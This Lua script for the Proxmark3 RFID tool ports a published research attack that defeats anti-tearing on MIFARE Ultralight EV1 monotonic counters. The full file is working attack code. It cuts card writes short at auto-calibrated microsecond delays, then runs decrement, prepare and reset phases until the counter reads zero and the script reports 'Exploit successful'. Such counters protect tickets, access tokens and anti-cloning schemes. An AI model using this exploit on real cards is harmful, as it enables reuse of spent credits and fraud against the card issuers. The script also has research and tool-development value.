-- Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).
-- Lua port of the pyscript client/pyscripts/mfuev1_counter_reset.py (v2.2.0),
-- based on Quarkslab research "RFID Monotonic Counter Anti-Tearing Defeated"
--
-- Script version: v1.0.0
-- Original by W0rthlessS0ul (https://github.com/W0rthlessS0ul), updated by M35MAR

local ac = require('ansicolors')

copyright = '(c) 2025 W0rthlessS0ul, M35MAR'
author = 'W0rthlessS0ul, M35MAR'
version = 'v1.0.0'
desc = [[
Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).
Lua port of the pyscript mfuev1_counter_reset.py, based on Quarkslab research]]
example = [[
-- default
script run mfuev1_counter_reset.lua -c 0
-- skip pre-flight checks
script run mfuev1_counter_reset.lua -c 0 -f
-- manual delays
script run mfuev1_counter_reset.lua -c 0 --DelayBD 2720 --Delay00 2705
]]
usage = [[
script run mfuev1_counter_reset.lua [-h | -f | -c <0-2> | --DelayBD <us> | --Delay00 <us>]
]]
arguments = [[
-h              This help
-f              Skip pre-flight checks
-c              Counter index (0-2)
--DelayBD <us>  Manual BD delay, disables auto-calibration
--Delay00 <us>  Manual 00 delay
]]

-- Known EV1 limits / artifacts
local COUNTER_MAX = 0xFFFFFF
local COUNTER_PREPARE_TARGET = 0x00FFFF
local TEAR_STUCK_VALUE = 6           -- counter may be read as 6 after a failed tear

-- Calibration and delay tuning
local DELAY_BD_MIN = 2700
local DELAY_BD_MAX = 5000
local CAL_STEP_US = 5
local DELAY_00_OFFSET = 10           -- delay_00 = BD - this offset
local DELAY_TUNE_STEP = 1
local DELAY_TUNE_JUMP = 10

local RETRY_COUNT = 3
local RETRY_SLEEP_MS = 200
local TEAR_REPAIR_ATTEMPTS = 5

local NACK_BYTES = { ['04'] = true, ['05'] = true, ['06'] = true, ['0A'] = true, ['0a'] = true }
-- CHECK_TEARING_EVENT only ever answers 0x00 (no tear) or 0xBD (tear detected).
local VALID_TEARING_BYTES = { ['00'] = true, ['BD'] = true }

-- Helper: same marker style as the python script, "[<char>]" with a colored char
local function mark(colorname, char)
    return '[' .. ac[colorname] .. char .. ac.reset .. ']'
end

local function strip_ansi(text)
    return (tostring(text):gsub('\27%[[%d;]*m', ''))
end

-- Return hex bytes from the last Proxmark3 [+] line, before the CRC bracket
local function extract_pm3_payload(output)
    local clean = strip_ansi(output)
    local last = nil
    for m in clean:gmatch('%[%+%]%s+([^%n%[]+)') do last = m end
    if not last then return '' end
    last = last:gsub('%s+%[.*$', '')
    return last:gsub('^%s+', ''):gsub('%s+$', '')
end

local function format_counter_hex(counter_int)
    return string.format('%02X%02X%02X',
        counter_int % 0x100,
        math.floor(counter_int / 0x100) % 0x100,
        math.floor(counter_int / 0x10000) % 0x100)
end

-- Return 6 hex chars, little-endian (LSB first) for INCR_CNT
local int_to_incr_bytes = format_counter_hex

local function run_pm3(cmd)
    return strip_ansi(core.console(cmd, true, true) or '')
end

local function wake_card()
    run_pm3('hf 14a reader')
end

local function sleep(ms)
    core.console('msleep -t ' .. ms)
end

local function parse_counter_output(output)
    local payload = extract_pm3_payload(output)
    if payload == '' then return nil, nil end

    local parts = {}
    for tok in payload:gmatch('%S+') do parts[#parts + 1] = tok end
    -- Single-byte reply is usually a NACK, not a 24-bit counter.
    if #parts == 1 then return nil, nil end
    if #parts < 3 then return nil, nil end

    local b = {}
    for i = 1, 3 do
        local v = tonumber(parts[i], 16)
        if v == nil then return nil, nil end
        b[i] = v
    end
    local counter_int = b[1] + b[2] * 0x100 + b[3] * 0x10000
    return format_counter_hex(counter_int), counter_int
end

-- Return (torn, raw) or (nil, raw) when the reply is not a valid tearing byte.
local function parse_tearing_output(output)
    local payload = extract_pm3_payload(output)
    if payload == '' then return nil, '?' end

    local tearing = nil
    for tok in payload:gmatch('%S+') do tearing = tok break end
    if tearing == nil then return nil, '?' end
    tearing = tearing:upper()
    if not VALID_TEARING_BYTES[tearing] then return nil, tearing end
    return tearing == 'BD', tearing
end

local function read_counter(counter_index)
    for _ = 1, RETRY_COUNT do
        local counter_hex, counter_int = parse_counter_output(
            run_pm3(('hf 14a raw -s -c 39 0%s'):format(counter_index)))
        if counter_hex ~= nil then return counter_hex, counter_int end
        wake_card()
        sleep(RETRY_SLEEP_MS)
    end
    return nil, nil
end

local function check_tearing_event(counter_index)
    for _ = 1, RETRY_COUNT do
        local tearing_ok, tearing = parse_tearing_output(
            run_pm3(('hf 14a raw -s -c 3E 0%s'):format(counter_index)))
        if tearing_ok ~= nil then return tearing_ok, tearing end
        sleep(RETRY_SLEEP_MS)
    end
    return false, '?'
end

local function enable_tearoff(delay_us)
    run_pm3(('hw tearoff --delay %d'):format(delay_us))
    local output = run_pm3('hw tearoff --on')
    return output:lower():find('enabled', 1, true) ~= nil
end

local function disable_tearoff()
    run_pm3('hw tearoff --off')
end

local function incr_cnt(counter_index, payload_hex)
    run_pm3(('hf 14a raw -s -c A5 0%s %s 00'):format(counter_index, payload_hex))
end

local function repair_tear_flag(counter_index)
    wake_card()
    for _ = 1, TEAR_REPAIR_ATTEMPTS do
        local _, tearing = check_tearing_event(counter_index)
        if VALID_TEARING_BYTES[tearing] then return true end
        incr_cnt(counter_index, '000000')
        incr_cnt(counter_index, '000000')
        sleep(RETRY_SLEEP_MS)
    end

    print(mark('yellow', '!') .. ' Attempting tear-off repair...')
    enable_tearoff(2950)
    incr_cnt(counter_index, '010000')
    sleep(RETRY_SLEEP_MS)
    wake_card()
    local _, tearing = check_tearing_event(counter_index)
    return VALID_TEARING_BYTES[tearing] == true
end

local function normalize_tear_flag(counter_index)
    for _ = 1, TEAR_REPAIR_ATTEMPTS * 2 do
        local _, tearing = check_tearing_event(counter_index)
        if VALID_TEARING_BYTES[tearing] then return end
        incr_cnt(counter_index, '000000')
    end
end

local function run_decrement_step(counter_index, delay_bd, delay_00)
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '000100')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '000000')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    normalize_tear_flag(counter_index)
end

local function run_reset_step(counter_index, delay_bd, delay_00)
    enable_tearoff(delay_bd)
    incr_cnt(counter_index, '010000')
    enable_tearoff(delay_00)
    incr_cnt(counter_index, '000000')
    normalize_tear_flag(counter_index)
end

-- Tune BD delay based on counter changes, locked delay is kept as is
local function tune_delay(delay_bd, previous_counter, current_counter, locked)
    if locked then return delay_bd end
    if current_counter == previous_counter then
        return math.min(DELAY_BD_MAX, delay_bd + DELAY_TUNE_STEP)
    end
    if current_counter - previous_counter > DELAY_TUNE_JUMP then
        return math.max(DELAY_BD_MIN, delay_bd - DELAY_TUNE_STEP)
    end
    return delay_bd
end

local function is_ev1_card()
    wake_card()
    local payload = extract_pm3_payload(run_pm3('hf 14a raw -s -c 60'))
    local parts = {}
    for tok in payload:gmatch('%S+') do parts[#parts + 1] = tok end

    -- GET_VERSION layout: [0]=?, [1]=vendor, [2]=product type, [3]=subtype,
    -- [4]=major version, [5]=minor version, [6]=size, [7]=protocol type.
    -- MIFARE Ultralight EV1 -> product type 0x03, major version 0x01.
    -- NTAG also reports major 0x01, so the product type must be checked too.
    if #parts >= 5 then
        local product_type = tonumber(parts[3], 16)
        local major_version = tonumber(parts[5], 16)
        if product_type and major_version then
            if product_type == 0x03 and major_version == 0x01 then return true end
        end
    end

    local info = run_pm3('hf mfu info'):lower()
    if info:find('ul ev1', 1, true) ~= nil then return true end
    if info:find('ultralight ev1', 1, true) ~= nil then return true end
    if info:find('ul%-ev1', 1, true) ~= nil then return true end
    return false
end

local function preflight_checks(counter_index)
    wake_card()
    if not is_ev1_card() then
        print(mark('red', '!') .. ' Support only Mifare UL EV1 cards')
        return false
    end

    if not repair_tear_flag(counter_index) then
        local _, tearing = check_tearing_event(counter_index)
        print(mark('red', '!') .. (' Could not repair tear flag (got 0x%s)'):format(tearing))
        return false
    end

    local _, tearing = check_tearing_event(counter_index)
    if not VALID_TEARING_BYTES[tearing] then
        print(mark('red', '!') .. ' Card does not support CHECK_TEARING_EVENT')
        return false
    end

    local _, counter = read_counter(counter_index)
    if counter == nil then
        print(mark('red', '!') .. ' Cannot read initial counter')
        return false
    end
    if counter == COUNTER_MAX then
        print(mark('red', '!') .. string.format(' Counter is at maximum (0x%06X), cannot reset', COUNTER_MAX))
        return false
    end
    if counter == 0 then
        print(mark('red', '!') .. ' Counter is already at minimum (0)')
        return false
    end

    print(mark('blue', '*') .. string.format(' Counter %s: %d (0x%s) | Tear: 0x%s',
        counter_index, counter, format_counter_hex(counter), tearing))
    return true
end

-- Auto-calibrate the BD delay. Returns (delay_bd, delay_00) or (nil, nil) on
-- failure; an interruption mid-loop returns the current (best_bd, nil) exactly
-- like the python script does.
local function calibrate_bd_delay(counter_index)
    local best_bd = nil

    local delay_bd = DELAY_BD_MIN
    while delay_bd < DELAY_BD_MAX do
        if core.kbd_enter_pressed() then
            return best_bd, nil
        end

        local initial_hex, initial_int = read_counter(counter_index)
        if initial_hex == nil then
            repair_tear_flag(counter_index)
        else
            enable_tearoff(delay_bd)
            incr_cnt(counter_index, '000000')
            local check_tearing, tear_flag = check_tearing_event(counter_index)
            incr_cnt(counter_index, '000000')
            incr_cnt(counter_index, '000000')

            local final_hex, final_int = read_counter(counter_index)
            if final_hex == nil then
                repair_tear_flag(counter_index)
            else
                local tear_color = check_tearing and ac.green or ac.red
                local stable = final_int == initial_int
                io.write("\r[" .. ac.yellow .. "=" .. ac.reset .. "] Testing delay: "
                    .. ac.yellow .. delay_bd .. ac.reset .. " us | "
                    .. "Check tearing: " .. tear_color .. tear_flag .. ac.reset .. " | "
                    .. "Counter: " .. ac.yellow .. initial_hex:upper() .. ac.reset
                    .. " -> " .. ac.yellow .. final_hex:upper() .. ac.reset)
                io.flush()

                if check_tearing then
                    best_bd = delay_bd
                    if stable then
                        print("\n" .. mark('green', '+') .. " Working BD delay: "
                            .. ac.green .. delay_bd .. ac.reset .. " us")
                        return delay_bd, math.max(DELAY_BD_MIN, delay_bd - DELAY_00_OFFSET)
                    end
                end
            end
        end

        delay_bd = delay_bd + CAL_STEP_US
    end

    if best_bd ~= nil then
        print("\n" .. mark('yellow', '!') .. " Counter drift during calibration; "
            .. "using last BD delay: " .. ac.green .. best_bd .. ac.reset .. " us")
        return best_bd, math.max(DELAY_BD_MIN, best_bd - DELAY_00_OFFSET)
    end

    print("\n" .. mark('red', '!') .. " Auto-calibration failed; try manual --DelayBD 2720")
    return nil, nil
end

local function attack_loop(counter_index, delay_bd, delay_00)
    local phase = 'decrement'
    local attempt = 0
    local reset_attempts = 0
    local delay_locked = false

    local _, baseline_counter = read_counter(counter_index)
    if baseline_counter == nil then baseline_counter = 0 end

    local tune_reference = baseline_counter
    local reset_reference = baseline_counter

    while core.kbd_enter_pressed() == false do
        local counter_hex, counter_int = read_counter(counter_index)
        if counter_hex == nil then
            repair_tear_flag(counter_index)
            sleep(RETRY_SLEEP_MS)
        elseif counter_int == 0 then
            print('\n[+] Exploit successful')
            return true
        elseif counter_int == TEAR_STUCK_VALUE then
            repair_tear_flag(counter_index)
        elseif phase == 'decrement' then
            if counter_int <= COUNTER_PREPARE_TARGET then
                print('\n[=] Switching to PREPARE phase (counter <= 0x00FFFF)')
                incr_cnt(counter_index, '000000')
                sleep(RETRY_SLEEP_MS)
                incr_cnt(counter_index, '000000')
                phase = 'prepare'
                reset_reference = counter_int
            else
                local initial_hex, initial_int = counter_hex, counter_int
                run_decrement_step(counter_index, delay_bd, delay_00)

                if core.kbd_enter_pressed() then break end

                local final_hex, final_int = read_counter(counter_index)
                if final_hex ~= nil and final_int ~= TEAR_STUCK_VALUE then
                    local _, tear_flag = check_tearing_event(counter_index)
                    attempt = attempt + 1
                    io.write("\r[" .. ac.red .. "DEC" .. ac.reset .. "] Att " .. attempt
                        .. " | BD/00: " .. delay_bd .. "/" .. delay_00 .. " us"
                        .. " | Tear: " .. tear_flag
                        .. " | " .. initial_hex:upper() .. " -> " .. final_hex:upper() .. "  ")
                    io.flush()

                    if final_int < initial_int then
                        print("\n" .. mark('green', '+') .. " Decrement! "
                            .. initial_hex:upper() .. " -> " .. final_hex:upper()
                            .. " (delta " .. (initial_int - final_int) .. ")")
                        -- Consolidate the drop by normalizing tear flag
                        normalize_tear_flag(counter_index)
                        delay_locked = true
                        tune_reference = final_int
                    elseif final_int > initial_int then
                        if delay_locked then
                            delay_locked = false
                            tune_reference = final_int
                        else
                            local new_delay = tune_delay(delay_bd, tune_reference, final_int, false)
                            if new_delay ~= delay_bd then delay_bd = new_delay end
                            tune_reference = final_int
                        end
                    else
                        if not delay_locked then
                            local new_delay = tune_delay(delay_bd, tune_reference, final_int, false)
                            if new_delay ~= delay_bd then delay_bd = new_delay end
                            tune_reference = final_int
                        end
                    end
                end
            end
        elseif phase == 'prepare' then
            if counter_int < COUNTER_PREPARE_TARGET and counter_int ~= TEAR_STUCK_VALUE then
                local diff = COUNTER_PREPARE_TARGET - counter_int
                local diff_hex = int_to_incr_bytes(diff)
                io.write("\r[" .. ac.yellow .. "PREPARE" .. ac.reset .. "] Incrementing by " .. diff
                    .. " to reach 0x" .. string.format('%06X', COUNTER_PREPARE_TARGET) .. "...")
                io.flush()
                incr_cnt(counter_index, diff_hex)
                incr_cnt(counter_index, '000000')
            elseif counter_int == COUNTER_PREPARE_TARGET then
                print(string.format('\n[=] Counter at 0x%06X, switching to RESET phase', COUNTER_PREPARE_TARGET))
                phase = 'reset'
                reset_attempts = 0
                reset_reference = COUNTER_PREPARE_TARGET
                delay_locked = false
            else
                phase = 'decrement'
            end
        elseif phase == 'reset' then
            local initial_hex, initial_int = counter_hex, counter_int
            run_reset_step(counter_index, delay_bd, delay_00)

            if core.kbd_enter_pressed() then break end

            local final_hex, final_int = read_counter(counter_index)
            if final_hex ~= nil and final_int ~= TEAR_STUCK_VALUE then
                reset_attempts = reset_attempts + 1
                io.write("\r[" .. ac.green .. "RESET" .. ac.reset .. "] Att " .. reset_attempts
                    .. " | BD/00: " .. delay_bd .. "/" .. delay_00 .. " us"
                    .. " | " .. initial_hex:upper() .. " -> " .. final_hex:upper() .. "  ")
                io.flush()

                if final_int == 0 then
                    print('\n[+] ' .. ac.green .. 'Exploit successful' .. ac.reset)
                    return true
                end

                if final_int > COUNTER_PREPARE_TARGET then
                    print('\n[=] Counter increased, returning to DECREMENT')
                    phase = 'decrement'
                    tune_reference = final_int
                    delay_locked = false
                elseif final_int == initial_int then
                    local new_delay = tune_delay(delay_bd, reset_reference, final_int, false)
                    if new_delay ~= delay_bd then delay_bd = new_delay end
                    reset_reference = final_int
                elseif final_int < initial_int then
                    print("\n" .. mark('green', '+') .. " Reset decrement! "
                        .. initial_hex:upper() .. " -> " .. final_hex:upper()
                        .. " (delta " .. (initial_int - final_int) .. ")")
                    delay_locked = true
                    reset_reference = final_int
                end
                -- else final_int slightly higher but still within range - ignore
            end
        end
    end

    return false
end

local function print_help()
    print(ac.cyan .. 'Counter reset of Mifare UL EV1 cards' .. ac.reset)
    print()
    print(ac.green .. 'usage:' .. ac.reset .. ' script run mfuev1_counter_reset.lua [-h | -f | -c <0-2> | --DelayBD <us> | --Delay00 <us>]')
    print()
    print(ac.green .. 'options:' .. ac.reset)
    print('  -h             This help')
    print('  -c             Counter index (0-2)')
    print('  -f             Skip pre-flight checks')
    print('  --DelayBD <us> Manual BD delay, disables auto-calibration')
    print('  --Delay00 <us> Manual 00 delay')
    print()
    print(ac.green .. 'examples:' .. ac.reset)
    print('  script run mfuev1_counter_reset.lua -c 0')
    print('  script run mfuev1_counter_reset.lua -c 0 -f')
    print('  script run mfuev1_counter_reset.lua -c 0 --DelayBD 2720 --Delay00 2705')
    return 0
end

local function parse_args(argstr)
    local opts = { cnt = '0', force = false, delaybd = nil, delay00 = nil }
    local toks = {}
    for t in argstr:gmatch('%S+') do toks[#toks + 1] = t end

    local i = 1
    while i <= #toks do
        local t = toks[i]

        if t == '-h' or t == '--help' then
            opts.help = true
        elseif t == '-f' or t == '--force' then
            opts.force = true
        elseif t == '-c' or t == '--cnt' then
            i = i + 1
            if toks[i] == nil then return nil, '-c/--cnt requires a value' end
            opts.cnt = toks[i]
        elseif t:sub(1, 2) == '-c' and #t > 2 then
            opts.cnt = t:sub(3)
        elseif t:sub(1, 9) == '--DelayBD' then
            local v = t:match('^%-%-DelayBD=(.*)$')
            if v == nil then
                i = i + 1
                v = toks[i]
            end
            if v == nil then return nil, '--DelayBD requires a value' end
            opts.delaybd = tonumber(v)
        elseif t:sub(1, 9) == '--Delay00' then
            local v = t:match('^%-%-Delay00=(.*)$')
            if v == nil then
                i = i + 1
                v = toks[i]
            end
            if v == nil then return nil, '--Delay00 requires a value' end
            opts.delay00 = tonumber(v)
        else
            return nil, 'unrecognized argument: ' .. t
        end

        i = i + 1
    end

    if opts.cnt ~= '0' and opts.cnt ~= '1' and opts.cnt ~= '2' then
        return nil, "invalid choice for -c/--cnt: '" .. tostring(opts.cnt) .. "' (choose from '0', '1', '2')"
    end
    if opts.delaybd ~= nil and math.floor(opts.delaybd) ~= opts.delaybd then
        return nil, 'invalid int value for --DelayBD: must be an integer'
    end
    if opts.delay00 ~= nil and math.floor(opts.delay00) ~= opts.delay00 then
        return nil, 'invalid int value for --Delay00: must be an integer'
    end

    return opts, nil
end

-- Main body, run through pcall so disable_tearoff() always executes (finally)
local function main_body(argstr)
    local opts, err = parse_args(argstr)
    if err ~= nil or opts.help then
        if err ~= nil then
            print(mark('yellow', '?') .. ' ' .. err)
            io.write('\n')
        end
        print_help()
        return (err ~= nil) and 1 or 0
    end

    print(ac.cyan .. 'Attack against the monotonic counters of MFU EV1 using the tear-off technique.' .. ac.reset)
    print(ac.cyan .. 'Note: If the counter does not reset after a few attempts, increment it to 2^n and retry.' .. ac.reset)
    print()

    if not opts.force and not preflight_checks(opts.cnt) then
        print(mark('yellow', '?') .. ' Try ' .. ac.yellow .. "`script run mfuev1_counter_reset.lua -f`" .. ac.reset .. ' if this is a false negative')
        return 1
    end

    local delay_bd, delay_00

    if opts.delaybd == nil then
        local bd, d00 = calibrate_bd_delay(opts.cnt)
        if bd == nil then
            -- python: result[0] is None -> silent exit (no additional message)
            return 1
        end
        delay_bd, delay_00 = bd, d00
        if opts.delay00 ~= nil then
            delay_00 = opts.delay00
            print(mark('green', '+') .. ' Using manual 00 delay: ' .. ac.green .. delay_00 .. ac.reset .. ' us')
        end
    else
        delay_bd = opts.delaybd
        delay_00 = opts.delay00 ~= nil and opts.delay00 or delay_bd - DELAY_00_OFFSET
        print(mark('green', '+') .. ' Using manual BD delay: ' .. ac.green .. delay_bd .. ac.reset .. ' us')
        if opts.delay00 ~= nil then
            print(mark('green', '+') .. ' Using manual 00 delay: ' .. ac.green .. delay_00 .. ac.reset .. ' us')
        end
    end

    if core.kbd_enter_pressed() then
        print('\n[x] Interrupted by user.')
        return 0
    end

    if attack_loop(opts.cnt, delay_bd, delay_00) then
        return 0
    end

    if core.kbd_enter_pressed() then
        print('\n[x] Interrupted by user.')
        return 0
    end
    return 1
end

local function run(argstr)
    if type(argstr) ~= 'string' then argstr = '' end
    local ok, res = pcall(main_body, argstr)
    -- python finally: always deactivate the tear-off hook
    disable_tearoff()
    if not ok then
        print('\n[x] Error: ' .. tostring(res))
        return 1
    end
    return res or 0
end

return run(args)
